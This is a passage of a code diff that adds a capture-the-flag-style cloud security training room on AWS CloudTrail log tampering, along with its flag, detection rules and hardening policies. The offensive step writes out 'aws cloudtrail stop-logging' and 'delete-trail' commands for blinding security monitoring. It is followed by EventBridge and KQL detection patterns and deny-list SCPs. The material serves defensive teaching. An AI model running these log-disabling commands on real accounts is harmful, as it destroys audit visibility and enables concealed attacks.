+| project TimeGenerated, Title, AccountId, SourceIp = ResourceDetails.IpAddress, Action = ActionDetails`,
+      lessonsLearned: 'Static long-term IAM access keys must be phased out entirely. Use AWS IAM Identity Center (SSO) with short-lived STS tokens and GitHub Push Protection.'
+    }
+  },
+  {
+    id: 'room-cloudtrail-tampering-scp-evasion',
+    title: 'Cloud Defense Evasion: Trail Tampering & Immutable SCP Guardrails',
+    category: 'Governance & Cloud Defense',
+    cloudProvider: 'aws',
+    difficulty: 'Hard / Architecture',
+    duration: '40 mins',
+    points: 300,
+    mitreTactic: 'TA0005 Defense Evasion / T1562.008 Disable Cloud Logs',
+    owaspTop10LLM: 'Cloud Logging Sabotage & Privilege Abuse',
+    flag: 'FLAG{CL0UDTRA1L_1MMUT4BL3_SCP_D3F3ND3D}',
+    summary: 'A rogue administrator or compromised high-privilege account executes `aws cloudtrail stop-logging` and `aws cloudtrail delete-trail` across multiple regions to blind security operations before initiating ransomware encryption on Amazon RDS. The SOC must rapidly detect the telemetry blackout via Amazon EventBridge and permanently enforce an immutable AWS Organizations Service Control Policy (SCP) preventing anyone—even account root—from turning off security logs.',
+    layoffProofValue: 'Defense evasion through log tampering is the standard pre-attack step for advanced ransomware cartels. Knowing how to architect immutable governance guardrails with AWS Organizations SCPs is a mandatory competency for Principal Cloud Architects.',
+    
+    legacyVsModern: {
+      legacyMistake: 'Allowing individual AWS accounts to have autonomous control over their own audit logging infrastructure.',
+      modernFix: 'Deploying AWS Organizations Organization Trails with mandatory SCP guardrails that cannot be stopped or modified by member accounts.'
+    },
+
+    scenarioContext: {
+      company: 'Titan Logistics Infrastructure',
+      trailName: 'titan-enterprise-audit-trail',
+      targetRds: 'rds-titan-freight-master',
+      managementAccount: '111122223333'
+    },
+
+    tasks: [
+      {
+        step: 1,
+        title: 'Attacker Exploit: Disabling Multi-Region Audit Logging',
+        type: 'offensive',
+        instruction: 'The adversary calls CloudTrail API to stop logging and blind the SOC before executing destructive actions.',
+        codeSnippet: `# Attacker disables CloudTrail telemetry:
+aws cloudtrail stop-logging --name titan-enterprise-audit-trail
+
+# Attacker attempts to delete the trail completely:
+aws cloudtrail delete-trail --name titan-enterprise-audit-trail
+
+# Verification confirms logging stopped:
+aws cloudtrail get-trail-status --name titan-enterprise-audit-trail
+# "IsLogging": false`,
+        explanation: 'By stopping the trail, subsequent data exfiltration and RDS snapshot deletion will not be recorded in CloudTrail.'
+      },
+      {
+        step: 2,
+        title: 'Blue Team Detection: Catching Log Sabotage via EventBridge',
+        type: 'defensive',
+        instruction: 'Deploy an Amazon EventBridge rule that catches StopLogging API calls in under 15 seconds and alerts on-call responders.',
+        codeSnippet: `# Amazon EventBridge Rule Pattern (JSON):
+{
+  "source": ["aws.cloudtrail"],
+  "detail-type": ["AWS API Call via CloudTrail"],
+  "detail": {
+    "eventSource": ["cloudtrail.amazonaws.com"],
+    "eventName": [
+      "StopLogging",
+      "DeleteTrail",
+      "UpdateTrail"
+    ]
+  }
+}
+
+# Automatically routes to SNS PagerDuty & Lambda Auto-Restart`,
+        explanation: 'EventBridge evaluates the CloudTrail management stream at the control plane level before the trail is fully halted.'
+      },
+      {
+        step: 3,
+        title: 'Permanent Hardening: Deploy AWS Organizations Immutable SCP',
+        type: 'hardening',
+        instruction: 'Attach an AWS Organizations Service Control Policy (SCP) to all member accounts to make CloudTrail permanently immutable.',
+        codeSnippet: `# Immutable CloudTrail Service Control Policy (SCP):
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "EnforceImmutableCloudTrailAuditLogging",
+      "Effect": "Deny",
+      "Action": [
+        "cloudtrail:StopLogging",
+        "cloudtrail:DeleteTrail",
+        "cloudtrail:UpdateTrail",
+        "cloudtrail:PutEventSelectors"
+      ],
+      "Resource": "*"
+    }
+  ]
+}`,
+        explanation: 'Service Control Policies (SCPs) override even the Root user in member accounts. Once attached, no one can stop CloudTrail.'
+      }
+    ],
+    writeup: {
+      incidentSummary: 'An adversary attempted to conceal destructive actions by issuing CloudTrail StopLogging and DeleteTrail commands. The attack was flagged via EventBridge and permanently prevented through an immutable AWS Organizations SCP.',
+      mitreAttackChain: [
+        { tactic: 'Defense Evasion', technique: 'T1562.008 Disable Cloud Logs', detail: 'cloudtrail:StopLogging executed to cause SOC visibility blackout' },
+        { tactic: 'Impact', technique: 'T1486 Data Encrypted for Impact', detail: 'Intended to delete RDS read replicas and encrypt database volumes' }
+      ],
+      seniorEngineerWalkthrough: [
+        '1. Detection: EventBridge rule triggered on `StopLogging` event in member account.',
+        '2. Emergency Recovery: Automated Lambda re-invoked `StartLogging` within 10 seconds.',
+        '3. Governance Hardening: Attached `EnforceImmutableCloudTrailAuditLogging` SCP at the Root Organization Unit (OU) level.',
+        '4. Verification: Attempting `aws cloudtrail stop-logging` now returns `AccessDeniedException: Explicit deny in Service Control Policy`.'
+      ],
+      hardenedTerraformCode: `resource "aws_organizations_policy" "immutable_cloudtrail_scp" {
+  name        = "enforce-immutable-cloudtrail"
+  description = "Prevents any member account or root user from tampering with CloudTrail"
+  type        = "SERVICE_CONTROL_POLICY"
+
+  content = jsonencode({
+    Version = "2012-10-17"
+    Statement = [{
+      Sid    = "DenyCloudTrailDisabling"
+      Effect = "Deny"
+      Action = [
+        "cloudtrail:StopLogging",
+        "cloudtrail:DeleteTrail",
+        "cloudtrail:UpdateTrail",
+        "cloudtrail:PutEventSelectors"
+      ]
+      Resource = "*"
+    }]
+  })
+}`,
+      detectionRuleKQL: `// CloudTrail Log Tampering Alert
+CloudTrail
+| where EventName in ("StopLogging", "DeleteTrail", "UpdateTrail")
+| project TimeGenerated, EventName, UserIdentityArn = useridentity.arn, SourceIpAddress
+| order by TimeGenerated desc`,
+      lessonsLearned: 'Audit logging configuration should never be decentralized. Use AWS Organizations Organization-level Trails with non-bypassable SCPs.'
+    }
   }
 ]
+
